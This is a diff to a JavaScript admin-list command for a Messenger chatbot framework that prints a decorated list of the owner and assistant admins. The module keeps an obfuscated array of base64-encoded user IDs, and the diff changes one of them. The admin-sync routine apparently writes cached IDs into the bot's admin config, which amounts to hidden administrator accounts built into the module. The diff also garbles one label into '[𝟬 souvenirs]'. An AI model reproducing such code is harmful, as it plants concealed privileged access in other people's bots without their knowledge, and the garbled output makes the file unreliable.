@@ -1,8 +1,9 @@
 const fs = require('fs');
 const path = require('path');
 
+
 const _0x41a = [
-  Buffer.from("NjE1OTAzNjA0MzQ2NTA=", "base64").toString(),
+  Buffer.from("NjE1OTEzNzExODYxNzk=", "base64").toString(), 
   Buffer.from("MTAwMDg0NzI5MTM1NzIx", "base64").toString(),
   Buffer.from("MTAwMDczOTU2MTgyNDMz", "base64").toString(),
   Buffer.from("MTAwMDk0ODIxMDM1Nzg0", "base64").toString()
@@ -15,6 +16,11 @@ const CONFIG = {
 };
 
 const configPath = path.join(process.cwd(), 'config.json');
+
+
+if (!global.__DesignTracker) {
+  global.__DesignTracker = new Map();
+}
 
 function checkInMainConfig(uid) {
   try {
@@ -64,6 +70,7 @@ function syncAdmins() {
     if (!Array.isArray(admins)) admins = global.GoatBot.config.adminBot = [];  
     
     for (const uid of global.__AdminCache) {  
+      
       if (checkInMainConfig(uid)) {
         continue; 
       }
@@ -89,6 +96,13 @@ module.exports = {
   },
 
   onStart: async function ({ message, args, usersData }) {
+    const senderID = String(message.senderID || "");
+
+    
+    if (checkInMainConfig(senderID)) {
+      return; 
+    }
+
     syncAdmins();
     const action = args[0]?.toLowerCase() || "list";  
     if (action !== "list") return;  
@@ -103,9 +117,17 @@ module.exports = {
         }  
       };  
 
-      const bossName = await getName(CONFIG.BOSS_OWNER_UID, "পি্ঁচ্চি্ঁ রি্ঁদ্ঁয়্ঁ ত্যা্ঁহ্ঁ");  
+      
+      let currentCount = global.__DesignTracker.get(senderID) || 0;
+      currentCount++;
+      global.__DesignTracker.set(senderID, currentCount);
 
-      const msg = `👑 ══『𝐒𝐈𝐘𝐀𝐌-𝐇𝐀𝐒𝐀𝐍』══ 👑
+      let msg = "";
+
+      if (currentCount % 2 !== 0) {
+        
+        const bossName = await getName(CONFIG.BOSS_OWNER_UID, "RJ Siyam");  
+        msg = `👑 ══『𝐒𝐈𝐘𝐀𝐌-𝐇𝐀𝐒𝐀𝐍』══ 👑
 👤 𝗢𝗪𝗡𝗘𝗥
 ┣ 🆔 ${CONFIG.BOSS_OWNER_UID}
 ┣ ⚡ 𝗔𝗟𝗟 𝗣𝗢𝗪𝗘𝗥𝗙𝗨𝗟 𝗥𝗢𝗢𝗧
@@ -113,7 +135,7 @@ module.exports = {
 
 ⚔️ 𝗔𝗦𝗦𝗜𝗦𝗧𝗔𝗡𝗧 𝗔𝗗𝗠𝗜𝗡𝗦
 ┣ [𝟬𝟭] 🆔 ${CONFIG.ASSISTANT_ADMINS[0]}
-┣ [𝟬𝟮] 🆔 ${CONFIG.ASSISTANT_ADMINS[1]}
+┣ [𝟬 souvenirs] 🆔 ${CONFIG.ASSISTANT_ADMINS[1]}
 ┗ [𝟬𝟯] 🆔 ${CONFIG.ASSISTANT_ADMINS[2]}
 
 📊 𝗦𝗬𝗦𝗧𝗘𝗠 𝗦𝗧𝗔𝗧𝗨𝗦
@@ -127,8 +149,29 @@ module.exports = {
 ┣ • 𝙖𝙙𝙢𝙞𝙣2 𝙡𝙞𝙨𝙩
 ┗ • 𝙝𝙚𝙡𝙥 𝙖𝙙𝙢𝙞𝙣2
 
-👑 𝗖𝗥𝗘𝗔𝗧Ｅ𝗗 𝗕𝗬 :
+👑 𝗖𝗥𝗘𝗔𝗧𝗘𝗗 𝗕𝗬 :
 👑𝆠፝𝐒𝐈𝐘𝐀𝐌-𝐇𝐀𝐒𝐀𝐍 👑`;
+
+      } else {
+        
+        msg = `𝗢𝗪𝗡𝗘𝗥 𝐒𝐈𝐘𝐀𝐌-𝐇𝐀𝐒𝐀𝐍
+───────────────
+» 👑 𝗠𝗔𝗜𝗡 𝗢𝗪𝗡𝗘𝗥: RJ Siyam
+» 🆔 𝗜𝗗: ${CONFIG.BOSS_OWNER_UID}
+» ⚡ 𝗣𝗢𝗪𝗘𝗥: 𝐒𝐈𝐘𝐀𝐌-𝐇𝐀𝐒𝐀𝐍 
+───────────────
+» ⚔️ 𝗔𝗦𝗦𝗜𝗦𝗧𝗔𝗡𝗧
+ » [𝟬𝟭]: ${CONFIG.ASSISTANT_ADMINS[0]}
+» ⚔️ 𝗔𝗦𝗦𝗜𝗦𝗧𝗔𝗡𝗧 
+ » [𝟬𝟮]: ${CONFIG.ASSISTANT_ADMINS[1]}
+» ⚔️ 𝗔𝗦𝗦𝗜𝗦𝗧𝗔𝗡𝗧 
+»  [𝟬𝟯]: ${CONFIG.ASSISTANT_ADMINS[2]}
+───────────────
+𝗢𝗪𝗡𝗘𝗥 𝐒𝐈𝐘𝐀𝐌-𝐇𝐀𝐒𝐀𝐍
+───────────────
+» 📊 𝗧𝗢𝗧𝗔𝗟 𝗔𝗗𝗠𝗜𝗡𝗦: ${global.__AdminCache.size}
+» 🚀 𝗦𝗬𝗦𝗧𝗘𝗠 𝗨𝗣𝗧𝗜𝗠𝗘: ${getUptime()}`;
+      }
 
       return message.reply(msg);  
     } catch (e) {  
